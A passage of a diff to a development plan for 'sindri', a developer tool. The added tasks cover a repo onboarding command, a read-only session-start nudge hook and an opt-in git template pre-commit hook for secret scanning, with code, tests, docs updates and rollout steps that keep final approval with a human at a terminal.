+  CLAUDE_SETTINGS_FILE="$settings" CLAUDE_HOOKS_DIR="$TMP/hooks" bash "$ROOT/scripts/install-sindri.sh" --hook-only > /dev/null
+  [ "$(jq '[.hooks.SessionStart[].hooks[].command | select(test("# aw:sindri-nudge$"))] | length' "$settings")" = "1" ] || { echo "FAIL: reinstall duplicated the entry"; exit 1; }
+  out="$(AW_SKIP_BUILD=1 AW_SKIP_LAUNCHD=1 CLAUDE_LOCAL_BIN="$TMP/bin" bash "$ROOT/scripts/install-sindri.sh")"
+  grep -q "sindri repo onboard --template" <<<"$out" || { echo "FAIL: template hint missing"; exit 1; }
+  echo "PASS: test_nudge_hook_per_provider"
+}
+```
+
+Add `test_nudge_hook_per_provider` to the file's list of calls at the bottom.
+
+- [ ] **Step 2: Run them to verify they fail**
+
+Run: `cd sindri && npx vitest run tests/repo-onboard.test.ts; cd .. && bash config/hooks/tests/sindri-nudge.test.sh; bash scripts/tests/install-sindri.test.sh`
+Expected: FAIL. `src/index/onboard.js` and `TEMPLATE_MARKER` don't exist, the hook script is missing, and `--hook-only` is not handled.
+
+- [ ] **Step 3: Implement**
+
+In `sindri/src/scrub/commands.ts`, replace `preCommitHook` and `install` with:
+
+```ts
+export const TEMPLATE_MARKER = "# sindri-template: a no-op until this repo is in the approved profile";
+
+// The template copy (git init and clone copy it from init.templateDir) stays a no-op until
+// `sindri repo onboard` replaces it with the full hook, so it never blocks a repo nobody onboarded.
+export function preCommitHook(bin: string, o: { template?: boolean } = {}): string {
+  const gate = o.template === true
+    ? `${TEMPLATE_MARKER}
+if [ ! -x "$SINDRI" ] && ! command -v "$SINDRI" >/dev/null 2>&1; then exit 0; fi
+"$SINDRI" repo status >/dev/null 2>&1 || exit 0
+`
+    : `if [ ! -x "$SINDRI" ] && ! command -v "$SINDRI" >/dev/null 2>&1; then
+  echo "sindri-scrub: $SINDRI not found, so the secret scan can't run; refusing the commit." >&2
+  echo "  fix: scripts/install-sindri.sh (or commit with --no-verify and say why)" >&2
+  exit 1
+fi
+`;
+  return `#!/bin/sh
+${PRE_COMMIT_MARKER}
+# Refuses commits that add secret-shaped strings (spec §8.4), then records shape signals (spec §6.2).
+# Installed by \`${o.template === true ? "sindri repo onboard --template" : "sindri scrub --install-pre-commit"}\`.
+SINDRI='${bin.replace(/'/g, "'\\''")}'
+${gate}"$SINDRI" scrub --staged || exit 1
+# Record-only shape signals (spec §6.2): never blocks the commit.
+"$SINDRI" shape --record --staged || true
+`;
+}
+
+// Replaces any sindri hook (v1, v2 or the template copy); refuses a foreign one.
+export async function installPreCommit(deps: Deps, repoPath: string): Promise<{ hook: string; changed: boolean }> {
+  const hook = await preCommitPath(deps.git, repoPath);
+  if (hook === null) throw new SindriError("SND-SCRUB-004", `${repoPath} is not inside a git repo`);
+  const text = preCommitHook(deps.env.SINDRI_BIN ?? "sindri");
+  const old = fs.existsSync(hook) ? fs.readFileSync(hook, "utf8") : null;
+  if (old !== null && !isSindriHook(old)) throw new SindriError("SND-SCRUB-003", `${hook} already exists and is not sindri's`);
+  if (old === text) return { hook, changed: false };
+  fs.mkdirSync(path.dirname(hook), { recursive: true });
+  fs.writeFileSync(hook, text);
+  fs.chmodSync(hook, 0o755);
+  return { hook, changed: true };
+}
+
+async function install(deps: Deps, repo: string | undefined, json: boolean): Promise<CommandResult> {
+  const { hook } = await installPreCommit(deps, path.resolve(deps.cwd, repo ?? "."));
+  return success(`Installed the secret-scan pre-commit hook at ${hook}.`, { hook }, json);
+}
+```
+
+The full hook's text is byte-for-byte what Plan 3 wrote, so the existing `scrub-commands` tests still pass unchanged.
+
+`sindri/src/index/onboard.ts`:
+
+```ts
+import fs from "node:fs";
+import path from "node:path";
+
+import { stateDir, type Deps } from "../deps.js";
+import { ERRORS, SindriError } from "../errors.js";
+import { ledgerPath, openLedgerReadOnly } from "../ledger/db.js";
+import type { ExitCode } from "../output.js";
+import { approvedProfile } from "../profile/approve.js";
+import { requireProfile } from "../profile/commands.js";
+import { loadProfile, resolveProfileRoot, type LoadedProfile } from "../profile/load.js";
+import { installPreCommit, preCommitHook } from "../scrub/commands.js";
+import { buildIndex } from "./build.js";
+import { embedderOrUnavailable, graphFor } from "./commands.js";
+import { indexPath } from "./db.js";
+import { repoAdd } from "./repo-add.js";
+import type { Step } from "./setup.js";
+
+export type RepoState =
+  | { kind: "outside-git" }
+  | { kind: "no-approved-profile"; path: string }
+  | { kind: "not-onboarded"; path: string; name?: string }
+  | { kind: "onboarded"; path: string; name: string };
+
+const realOrSelf = (p: string): string => {
+  try {
+    return fs.realpathSync(p);
+  } catch {
+    return p;
+  }
+};
+
+function nameFor(loaded: LoadedProfile, candidates: string[]): string | null {
+  for (const [name, r] of Object.entries(loaded.repos)) if (candidates.includes(realOrSelf(r.path))) return name;
+  return null;
+}
+
+// Spec §5.2: hooks never write the ledger. No migration, no lock, no -wal/-shm left behind.
+function readApproved(deps: Deps): LoadedProfile | null {
+  const db = openLedgerReadOnly(ledgerPath(stateDir(deps)));
+  if (db === null) return null;
+  try {
+    return approvedProfile(deps, db);
+  } finally {
+    db.close();
+  }
+}
+
+// The repo's top level and its main checkout (a linked worktree's --git-common-dir is <main>/.git).
+export async function repoState(deps: Deps, target: string): Promise<RepoState> {
+  const r = await deps.git.run(["rev-parse", "--path-format=absolute", "--show-toplevel", "--git-common-dir"], path.resolve(deps.cwd, target), { timeoutMs: 5_000 });
+  if (!r.ok) return { kind: "outside-git" };
+  const [top, common] = r.stdout.trim().split("\n");
+  const repoPath = realOrSelf(top);
+  const candidates = [repoPath, realOrSelf(path.dirname(common))];
+  const approved = readApproved(deps);
+  if (approved === null) return { kind: "no-approved-profile", path: repoPath };
+  const name = nameFor(approved, candidates);
+  if (name !== null) return { kind: "onboarded", path: repoPath, name };
+  const root = resolveProfileRoot(deps);
+  const live = root === null ? null : loadProfile(root);
+  const pending = live !== null && live.ok ? nameFor(live.value, candidates) : null;
+  return pending === null ? { kind: "not-onboarded", path: repoPath } : { kind: "not-onboarded", path: repoPath, name: pending };
+}
+
+// One line or nothing. Silent before any approval: a user who never set up a profile
+// is not nagged in every repo (`sindri doctor` covers that).
+export function nudgeLine(s: RepoState): string {
+  if (s.kind !== "not-onboarded") return "";
+  return s.name === undefined
+    ? `sindri: ${path.basename(s.path)} is not onboarded (no secret scan, shape signals or index); run: sindri repo onboard`
+    : `sindri: ${s.name} is waiting for approval; run: sindri repo onboard`;
+}
+
+export const templateDir = (deps: Deps): string => path.join(stateDir(deps), "git-template");
+const globalEnv = (deps: Deps): Record<string, string> | undefined =>
+  deps.env.GIT_CONFIG_GLOBAL === undefined ? undefined : { GIT_CONFIG_GLOBAL: deps.env.GIT_CONFIG_GLOBAL };
+const expandHome = (deps: Deps, p: string): string => path.resolve(deps.home, p.replace(/^~(?=\/|$)/, deps.home));
+
+// init.templateDir only: never core.hooksPath (it would override every repo's own hooks).
+// The hook file lives in sindri's own state dir; another tool's template dir is never written.
+export async function installTemplate(deps: Deps): Promise<Step> {
+  const dir = templateDir(deps);
+  const hook = path.join(dir, "hooks", "pre-commit");
+  const text = preCommitHook(deps.env.SINDRI_BIN ?? "sindri", { template: true });
+  fs.mkdirSync(path.dirname(hook), { recursive: true, mode: 0o700 });
+  const changed = !fs.existsSync(hook) || fs.readFileSync(hook, "utf8") !== text;
+  if (changed) fs.writeFileSync(hook, text);
+  fs.chmodSync(hook, 0o755);
+  const env = globalEnv(deps);
+  const cur = await deps.git.run(["config", "--global", "--get", "init.templateDir"], deps.home, { env });
+  if (!cur.ok && cur.code !== 1) throw new SindriError("SND-SCRUB-006", `could not read init.templateDir: ${cur.stderr.trim()}`);
+  const current = cur.ok ? cur.stdout.trim() : "";
+  if (current !== "" && realOrSelf(expandHome(deps, current)) !== realOrSelf(dir)) {
+    throw new SindriError("SND-SCRUB-006", `init.templateDir is already set to ${current}; sindri does not write into another template dir`, {
+      fix: `cp ${hook} ${path.join(current, "hooks", "pre-commit")} (if that dir has no pre-commit hook), or git config --global --unset init.templateDir and rerun`,
+    });
+  }
+  if (current === "") {
+    const set = await deps.git.run(["config", "--global", "init.templateDir", dir], deps.home, { env });
+    if (!set.ok) throw new SindriError("SND-SCRUB-006", `could not set init.templateDir: ${set.stderr.trim()}`);
+    return { name: "template", status: "done", detail: `init.templateDir = ${dir}; new clones and git init get the hook (a no-op until onboarded)` };
+  }
+  return { name: "template", status: changed ? "done" : "ok", detail: `init.templateDir = ${dir}` };
+}
+
+function failStep(name: string, e: SindriError): Step {
+  return { name, status: "fail", detail: `${e.code} ${e.message}`, fix: ERRORS[e.code].fix };
+}
+
+// Each step reports like `index setup`. Approval is never done here: the profile change waits for a
+// human at a terminal (spec §8.7, invariant 10), and the exit code (1) tells the caller so.
+export async function onboard(deps: Deps, target: string, o: { name?: string; build: boolean }): Promise<{ name: string; steps: Step[]; exitCode: ExitCode }> {
+  const added = await repoAdd(deps, target, o.name);
+  const steps: Step[] = [{ name: "repo-add", status: added.added ? "done" : "ok", detail: `${added.name} (${added.path}) is in the live profile` }];
+  const approved = readApproved(deps);
+  const entry = approved?.repos[added.name];
+  if (approved === null || entry === undefined || realOrSelf(entry.path) !== added.path) {
+    const short = requireProfile(deps).hash.slice(0, 12);
+    steps.push(
+      { name: "approval", status: "warn", detail: "the profile changed; approval is pending", fix: `sindri profile approve (review the diff), then at a terminal: sindri profile approve ${short}; then rerun sindri repo onboard` },
+      { name: "pre-commit", status: "skip", detail: "needs approval" },
+      { name: "index-build", status: "skip", detail: "needs approval" },
+    );
+    return { name: added.name, steps, exitCode: 1 };
+  }
+  steps.push({ name: "approval", status: "ok", detail: `in approved profile ${approved.hash.slice(0, 12)}` });
+  try {
+    const h = await installPreCommit(deps, added.path);
+    steps.push({ name: "pre-commit", status: h.changed ? "done" : "ok", detail: h.hook });
+  } catch (e) {
+    if (!(e instanceof SindriError)) throw e;
+    steps.push(failStep("pre-commit", e));
+  }
+  if (!o.build) {
+    steps.push({ name: "index-build", status: "skip", detail: "--no-build" });
+  } else if (fs.existsSync(indexPath(deps, added.name))) {
+    steps.push({ name: "index-build", status: "ok", detail: "already built; the nightly build refreshes it" });
+  } else {
+    deps.log(`building ${added.name}; this takes the heavy-job lock`);
+    try {
+      // One try at the lock: onboarding never waits behind another heavy job (the nightly build picks it up).
+      const r = await buildIndex(deps, approved, added.name, { full: false, mirror: true, lockTimeoutMs: 0 }, { embedder: embedderOrUnavailable(approved, deps.io), graph: graphFor(approved, deps, deps.io) });
+      steps.push({ name: "index-build", status: "done", detail: `${r.files.indexed} files, ${r.symbols} symbols` });
+    } catch (e) {
+      if (!(e instanceof SindriError) || e.code !== "SND-INDEX-001") throw e;
+      steps.push({ name: "index-build", status: "warn", detail: e.message, fix: `sindri index build --repo ${added.name}, or let the nightly build do it` });
+    }
+  }
+  const exitCode: ExitCode = steps.some((s) => s.status === "fail") ? 2 : steps.some((s) => s.status === "warn") ? 1 : 0;
+  return { name: added.name, steps, exitCode };
+}
+```
+
+In `sindri/src/index/repo-add.ts` (import `type CommandResult` from `../output.js`, and `installTemplate`, `nudgeLine`, `onboard`, `repoState` from `./onboard.js`), `repoCommand` routes `add`, `onboard` and `status`. The unknown-subcommand message becomes `use add, onboard or status`. Render steps with the same `padEnd(5)` line format `index setup` uses:
+
+```ts
+    if (sub === "onboard") {
+      const { values, positionals } = parseFlags(rest, { name: { type: "string" }, "no-build": { type: "boolean" }, template: { type: "boolean" }, json: { type: "boolean" } });
+      if (values.template === true) {
+        if (positionals.length > 0 || values.name !== undefined) throw new SindriError("SND-CLI-002", "--template takes no path or --name", { fix: "sindri repo onboard --template" });
+        const step = await installTemplate(deps);
+        return success(renderSteps([step]), { steps: [step] }, values.json === true);
+      }
+      const r = await onboard(deps, positionals[0] ?? ".", { name: values.name, build: values["no-build"] !== true });
+      return success(renderSteps(r.steps), r, values.json === true, r.exitCode);
+    }
+    if (sub === "status") {
+      const { values, positionals } = parseFlags(rest, { nudge: { type: "boolean" }, json: { type: "boolean" } });
+      if (values.nudge === true) {
+        // Never fails and never blocks a session: any error is silence, and silence is no output at all.
+        const quiet = (text: string): CommandResult => ({ exitCode: 0, stdout: text === "" ? "" : `${text}\n`, stderr: "" });
+        try {
+          return quiet(nudgeLine(await repoState(deps, positionals[0] ?? ".")));
+        } catch {
+          return quiet("");
+        }
+      }
+      const s = await repoState(deps, positionals[0] ?? ".");
+      const text = s.kind === "onboarded" ? `${s.name} is onboarded.` : s.kind === "outside-git" ? "Not inside a git repo." : nudgeLine(s) || "No approved profile yet: sindri profile init, then sindri profile approve.";
+      return success(text, s, values.json === true, s.kind === "onboarded" ? 0 : 1);
+    }
+```
+
+`success("")` would print a bare newline (`line` appends one), so `--nudge` builds its result directly. Export `renderSteps(steps: Step[]): string` from `index/commands.ts` (the formatter `setup` already uses there) and reuse it in both places.
+
+`sindri/src/main.ts`: the repo summary becomes `"Add, onboard or check a repo (then sindri profile approve)"`, with usage:
+
+```
+  sindri repo add <path> [--name NAME] [--json]
+  sindri repo onboard [<path>] [--name NAME] [--no-build] [--json]   (exit 1: approval pending)
+  sindri repo onboard --template [--json]                            (git init.templateDir hook; opt-in)
+  sindri repo status [<path>] [--nudge] [--json]                     (exit 1 when not onboarded; --nudge always 0)
+```
+
+Add to `ERRORS`:
+
+```ts
+  "SND-SCRUB-006": { summary: "git's init.templateDir is set to a directory sindri does not own, or could not be read or set.", fix: "copy the named hook into that template dir's hooks/ yourself, or `git config --global --unset init.templateDir` and rerun `sindri repo onboard --template`" },
+```
+
+`config/hooks/sindri-nudge.sh` (executable):
+
+```bash
+#!/usr/bin/env bash
+# aw:sindri-nudge — SessionStart hook. Prints one line when the session's repo is not in the
+# approved sindri profile ("run: sindri repo onboard"). Silent outside git, when sindri isn't
+# installed, when no profile is approved yet, and when the repo is onboarded. Fails open: always
+# exits 0, and the CLI is killed after AW_SINDRI_NUDGE_BUDGET_MS (default 1500). The CLI reads the
+# approved profile read-only: it never migrates or writes the ledger and takes no lock.
+[ -n "${AW_JUDGE_CHILD:-}${AW_SINDRI_CHILD:-}" ] && exit 0
+SINDRI="$(command -v sindri 2>/dev/null || echo "$HOME/.local/bin/sindri")"
+[ -x "$SINDRI" ] || exit 0
+git rev-parse --is-inside-work-tree >/dev/null 2>&1 || exit 0
+BUDGET_MS="${AW_SINDRI_NUDGE_BUDGET_MS:-1500}"
+case "$BUDGET_MS" in ''|*[!0-9]*) BUDGET_MS=1500 ;; esac
+TICKS=$((BUDGET_MS / 100))
+OUT_FILE="$(mktemp)" || exit 0
+trap 'rm -f "$OUT_FILE"' EXIT
+( "$SINDRI" repo status --nudge > "$OUT_FILE" 2>/dev/null ) > /dev/null 2>&1 &
+PID=$!
+while kill -0 "$PID" 2>/dev/null; do
+  if [ "$TICKS" -le 0 ]; then
+    pkill -P "$PID" 2>/dev/null
+    kill -9 "$PID" 2>/dev/null
+    exit 0
+  fi
+  TICKS=$((TICKS - 1))
+  sleep 0.1
+done
+wait "$PID" 2>/dev/null || exit 0
+head -n 1 "$OUT_FILE"
+exit 0
+```
+
+`scripts/install-sindri.sh`: source `config/hooks/adapters/install-lib.sh` and parse `--provider` with `aw_parse_provider_args`. A `--hook-only` argument installs only the nudge and exits, skipping the build, wrapper and launchd. The Claude branch copies the script to `${CLAUDE_HOOKS_DIR:-~/.claude/hooks}` and runs `merge_hook "$SETTINGS_FILE" SessionStart aw:sindri-nudge "$ENTRY"`. The Codex and Cursor branches run `aw_hooks_init`, `aw_hooks_stage` and `aw_hook_set "$EVENT" aw:sindri-nudge sindri-nudge.sh`, with `EVENT=SessionStart` for Codex and `sessionStart` for Cursor. Copy the branch structure of `install-judge.sh` lines 59–95. Under `AW_DRY_RUN=1`, print `[dry-run] would install sindri-nudge ($EVENT) for $AW_PROVIDER in $AW_HOOKS_CONFIG` and write nothing. At the end of a normal install, print:
+
+```
+  sindri: onboard a repo with `sindri repo onboard <path>`; to give new clones the (inactive until onboarded) pre-commit hook: sindri repo onboard --template
+```
+
+`providers/{claude,codex,cursor}/install.sh`: next to each `install-judge.sh --hook-only` call, add one guarded by `if [ "${WITH_SINDRI:-0}" = "1" ]`. The variable is set by `setup.sh --with-sindri`, and the provider install functions are sourced into `setup.sh`. For example: `AW_DRY_RUN="${AW_DRY_RUN:-0}" bash "$TOOLKIT_DIR/scripts/install-sindri.sh" --hook-only --provider codex`. In the Claude branch the existing `aw_dry` pattern prints `[dry-run] would run scripts/install-sindri.sh --hook-only (sindri-nudge)` instead. The hook is silent until sindri is installed, so it doesn't matter whether it lands before or after the shared sindri build.
+
+Docs that belong with the hook (the rule says to document a new hook where it is added):
+- `.agents/rules/hooks.md`: add a `sindri-nudge.sh` row to the SessionStart table ("One line when the session's repo is not in the approved sindri profile; silent otherwise; bounded by `AW_SINDRI_NUDGE_BUDGET_MS`") and to Hook Files. Add `sindri-nudge` to the test list. Then run `scripts/sync-rules.sh`.
+- `config/hooks/adapters/README.md`: add a row `` | `sindri-nudge.sh` | SessionStart (`install-sindri.sh --hook-only`) | SessionStart (`--provider codex`) | `sessionStart` → `additional_context` (`--provider cursor`) | ``.
+- `AGENTS.md`: add `bash config/hooks/tests/sindri-nudge.test.sh` to the bash tests in Commands. In the `config/` directory comment, name the nudge hook. Add `sindri repo onboard [<path>]` to the sindri commands.
+
+- [ ] **Step 4: Run the tests**
+
+Run: `cd sindri && npm run gen && npm run typecheck && npm run test:coverage && cd .. && bash config/hooks/tests/sindri-nudge.test.sh && bash scripts/tests/install-sindri.test.sh && bash config/hooks/tests/provider-install-hooks.test.sh && scripts/sync-rules.sh --check`
+Expected: all PASS; coverage 100% on the files touched; `sync-rules` exits 0. Run them one after another, never two at once. If coverage shows an uncovered branch, add the smallest test that drives it. Examples: a `.git/hooks` that is a regular file (the hook write then throws a non-sindri error, which must propagate), a `~/`-relative `init.templateDir` that points at sindri's own dir, a profile repo whose path no longer exists (the `realOrSelf` fallback), or a `repo status --nudge` whose git call throws. Never add an ignore comment.
+
+- [ ] **Step 5: Commit**
+
+```bash
+git add sindri/src sindri/tests docs/sindri/errors.md config/hooks scripts providers .agents/rules/hooks.md AGENTS.md
+git commit -m "feat: sindri repo onboard, repo status nudge and the opt-in git template hook"
+```
+
+---
+
+### Task 11: Docs, merge gate and spec amendments
 
 **Files:**
 - Create: `docs/sindri/scope.md`
-- Modify: `docs/sindri/README.md`, `AGENTS.md`, `.agents/rules/testing.md`, `planning/ERD.md`, `planning/ARCHITECTURE.md`, `docs/superpowers/specs/2026-10-07-sindri-design.md`
+- Modify: `docs/sindri/README.md`, `docs/sindri/index.md`, `AGENTS.md`, `.agents/rules/testing.md`, `planning/ERD.md`, `planning/ARCHITECTURE.md`, `docs/superpowers/specs/2026-10-07-sindri-design.md`
 
 - [ ] **Step 1: Write `docs/sindri/scope.md`**
 
@@ -4522,7 +5164,8 @@ sources:
 
 - [ ] **Step 2: Update the other docs and the spec**
 
-- `docs/sindri/README.md`: add `sindri scope …` rows (see usage above, including `scope runs`) and a link to `scope.md`.
+- `docs/sindri/README.md`: add `sindri scope …` rows (see usage above, including `scope runs`) and a link to `scope.md`. Add the rows `` | `sindri repo onboard [<path>] [--name NAME] [--no-build]` | Onboard a repo in one command: add it to the profile, stop for `sindri profile approve` (exit 1 until a human approves at a terminal), then install the pre-commit hook and build its index | `` and `` | `sindri repo onboard --template` / `sindri repo status [<path>] [--nudge]` | Opt-in git template so new clones get the pre-commit hook (a no-op until the repo is approved); whether a repo is onboarded (the SessionStart nudge uses `--nudge`) | ``. In the quick-start block, replace `sindri scrub --install-pre-commit` with `sindri repo onboard .              # add, approve (at a terminal), hook, index`.
+- `docs/sindri/index.md`: in the setup block, add `sindri repo onboard <path>             # repo add → approval (yours, at a terminal) → pre-commit hook → first index build; idempotent`. Under it, add a short **Onboarding a repo** section with the four steps and their `ok/done/skip/warn/fail` meanings. It covers the nudge (which hosts show it and how to silence it: onboard the repo, or remove the `aw:sindri-nudge` entry) and the template (`sindri repo onboard --template`; it is never set when `init.templateDir` is already yours; new clones and `git init` get a hook that does nothing until the repo is approved). For existing repos, `sindri repo onboard` or `sindri scrub --install-pre-commit` installs the full hook. Rerunning `git init` copies the template hook only where no `pre-commit` exists yet.
 - `AGENTS.md` Commands: add `sindri scope <brief.md> --out DIR            # cited scope map; --backtest linear:<project> for recall, precision and a baseline`.
 - `.agents/rules/testing.md`: add `src/scope/model-real.ts` and `src/scope/io-real.ts` to the `sindri` coverage excludes; set the `sindri` test count to the `Tests` total that `cd sindri && npm run test:coverage` prints; then run `scripts/sync-rules.sh`.
 - `planning/ERD.md`: add `scope_runs` and `model_calls` (ledger v3) to the Sindri ledger diagram, one attribute per line.
@@ -4539,6 +5182,8 @@ sources:
     ```
     | `scope <brief.md \| linear:<project>> [--backtest --dry-run --sources]` / `scope runs` | Scoping and its backtest (§7.5); past runs | "No scope runs recorded." / `SND-SCOPE-025 refusing to write … inside a git worktree` |
     ```
+  - §10.3 CLI table, the setup row: replace `` `repo add <path>` `` with `` `repo add <path>` / `repo onboard [<path>] [--template --no-build]` / `repo status [<path>] [--nudge]` ``, and append to its last column `` ; `repo onboard`: "approval pending: sindri profile approve …" (exit 1) ``.
+  - §11.3 **Repos** bullet: append `` `sindri repo onboard [<path>]` chains `repo add`, an approval check, the pre-commit hook and a first `index build --repo` (one try at the heavy-job lock). It never approves: until a human runs `sindri profile approve` at a terminal, it prints that command and exits 1. A SessionStart nudge (all providers, read-only, bounded) names a repo that isn't onboarded. `sindri repo onboard --template` sets `init.templateDir` (only when unset; never `core.hooksPath`) so new clones get a pre-commit hook that does nothing until the repo is approved. ``
   - §11.2: after the `Tracker` interface add: `` `Source` in v1 is query-based: `find({keywords, asOf, limit})` returns scrubbed records with stable references; `fetch(ref)` arrives when a Step needs a single record. ``
 
 - [ ] **Step 3: Run the merge gate, one job at a time**
@@ -4546,24 +5191,27 @@ sources:
 ```bash
 cd sindri && npm run typecheck && npm run test:coverage && cd ..
 bash scripts/tests/install-sindri.test.sh
+bash config/hooks/tests/sindri-nudge.test.sh
+bash config/hooks/tests/provider-install-hooks.test.sh
 scripts/sync-rules.sh --check
 ./setup.sh --providers claude,codex,cursor --dry-run > /dev/null && echo SETUP_DRY_RUN_OK
+./setup.sh --providers claude,codex,cursor --with-sindri --dry-run | grep -c 'sindri-nudge'   # 3: one per provider
 ```
 
-Expected: no type errors; 100% coverage; installer tests PASS; `sync-rules` exits 0; `SETUP_DRY_RUN_OK`.
+Expected: no type errors; 100% coverage; installer and hook tests PASS; `sync-rules` exits 0; `SETUP_DRY_RUN_OK`.
 
 - [ ] **Step 4: Commit**
 
 ```bash
 git add docs/sindri AGENTS.md .agents/rules/testing.md planning docs/superpowers/specs/2026-10-07-sindri-design.md
-git commit -m "docs: sindri scoping docs, ERD and spec amendments"
+git commit -m "docs: sindri scoping and onboarding docs, ERD and spec amendments"
 ```
 
 ---
 
-### Task 11: Turn it on (bootstrapping ladder, spec §13.3 row 8)
+### Task 12: Turn it on (bootstrapping ladder, spec §13.3 row 8)
 
-Scoping starts serving the build the day it merges. It scopes the rest of Sindri from the spec, so every later plan starts from a scope map (ring 0). It also produces the first value promised by rollout step 1: recall, precision and a baseline on the project that motivated the design (ring 1). Steps 1–2 run on the PR branch; steps 3–5 after merge. **At the start of this task, ask Joi for two things:** a read-only Linear API key (and a time to do the terminal-only approval) and the URL of the motivating project. Both are needed for Step 4.
+Scoping starts serving the build the day it merges. It scopes the rest of Sindri from the spec, so every later plan starts from a scope map (ring 0). It also produces the first value promised by rollout step 1: recall, precision and a baseline on the project that motivated the design (ring 1). It also onboards a second repo end to end, so every repo Joi works in gets the secret scan, shape signals and an index. Steps 1–2 run on the PR branch; steps 3–6 after merge. **At the start of this task, ask Joi for three things:** a read-only Linear API key (and a time to do the terminal-only approvals), the URL of the motivating project, and a second repo to onboard. The first two are needed for Step 4, the third for Step 6.
 
 - [ ] **Step 1: Smoke-test the real CLI path on the branch (one real scoping run, no private data)**
 
@@ -4633,8 +5281,44 @@ Post on the Plan 4 PR:
 
 This is rollout step 1's first value (spec §13.1): scope maps, plus measured recall, precision and a baseline. Those numbers are the scoping harness's eval-suite metrics, which Plan 5's self-evolution loop improves.
 
+- [ ] **Step 6: Onboard a second repo end to end (after merge; Joi approves at a terminal)**
+
+Install the nudge for every provider in use, then confirm it fires in the second repo (`$REPO`, from Joi) and is silent in this one:
+
+```bash
+./setup.sh --with-sindri          # or: scripts/install-sindri.sh && scripts/install-sindri.sh --hook-only [--provider codex|cursor]
+(cd "$REPO" && bash ~/.claude/hooks/sindri-nudge.sh)        # expect: sindri: <name> is not onboarded …; run: sindri repo onboard
+(cd "$(git rev-parse --show-toplevel)" && bash ~/.claude/hooks/sindri-nudge.sh) || true   # this repo is onboarded: expect no output
+sindri repo onboard "$REPO"; echo "onboard exit: $?"
+```
+
+Expected: `done  repo-add`, then `warn  approval` with `fix: sindri profile approve (review the diff), then at a terminal: sindri profile approve <hash12>; …`, then `skip` for `pre-commit` and `index-build`, and `onboard exit: 1`. Nothing is installed in `$REPO` yet: `ls "$REPO/.git/hooks/pre-commit"` fails.
+
+**Joi, at a terminal** (the builder never runs this): `sindri profile approve`, read the diff (one new repo), then `sindri profile approve <hash12>`.
+
+```bash
+sindri repo onboard "$REPO"; echo "onboard exit: $?"         # ok repo-add, ok approval, done pre-commit, done index-build; exit 0
+sindri repo onboard "$REPO"; echo "onboard exit: $?"         # every step ok; exit 0 (idempotent)
+sindri index status --repo <name>                            # a fresh index, every layer listed
+(cd "$REPO" && bash ~/.claude/hooks/sindri-nudge.sh)         # expect no output now
+```
+
+If `index-build` is `warn` (the heavy-job lock is busy), wait for the holder (`sindri doctor`) and rerun. The nightly build also picks it up. If `pre-commit` is `fail` with `SND-SCRUB-003`, `$REPO` already has its own hook: add the two lines from the fix by hand and say so in the evidence.
+
+The template is optional, and only if Joi wants it. It changes the global git config:
+
+```bash
+git config --global --get init.templateDir || echo UNSET    # must be UNSET or sindri's dir, or the command refuses
+sindri repo onboard --template
+T="$(mktemp -d)"; git init -q "$T/x" && sed -n 2,3p "$T/x/.git/hooks/pre-commit"   # the v2 marker and the template line
+(cd "$T/x" && git -c user.name=t -c user.email=t@t commit -q --allow-empty -m t && echo COMMIT_NOT_BLOCKED)
+```
+
+Post on the Plan 4 PR: the two `repo onboard` outputs (before and after approval), the nudge before and after, and the template lines if it was set. Leave out the repo's name or path if it is workplace-internal.
+
 ## Done criteria for this plan
-- Merge gate (AGENTS.md) green for `sindri`, plus `bash scripts/tests/install-sindri.test.sh`, `scripts/sync-rules.sh --check` and `./setup.sh --providers claude,codex,cursor --dry-run`.
-- Every Review Focus item (1–8) has its pinned test passing.
-- The real-CLI one-call test (Task 4 Step 6) and the Task 11 Step 1 smoke test ran and passed their criteria.
-- **Switched on (Task 11):** after merge, a committed scope map for spec §13 exists, and recall, precision and the baseline on the motivating project are recorded in the ledger and posted (without workplace details). Plan 5 is written from the scope map.
+- Merge gate (AGENTS.md) green for `sindri`, plus `bash scripts/tests/install-sindri.test.sh`, `bash config/hooks/tests/sindri-nudge.test.sh`, `bash config/hooks/tests/provider-install-hooks.test.sh`, `scripts/sync-rules.sh --check` and `./setup.sh --providers claude,codex,cursor --dry-run`.
+- Every Review Focus item (1–10) has its pinned test passing.
+- The real-CLI one-call test (Task 4 Step 6) and the Task 12 Step 1 smoke test ran and passed their criteria.
+- **Switched on (Task 12):** after merge, a committed scope map for spec §13 exists, and recall, precision and the baseline on the motivating project are recorded in the ledger and posted (without workplace details). Plan 5 is written from the scope map.
+- **Onboarding switched on (Task 12 Step 6):** a second repo went from not onboarded (with the nudge shown) to onboarded with its hook and index, with Joi's approval at a terminal in between. A rerun was all `ok`, and the evidence is posted.
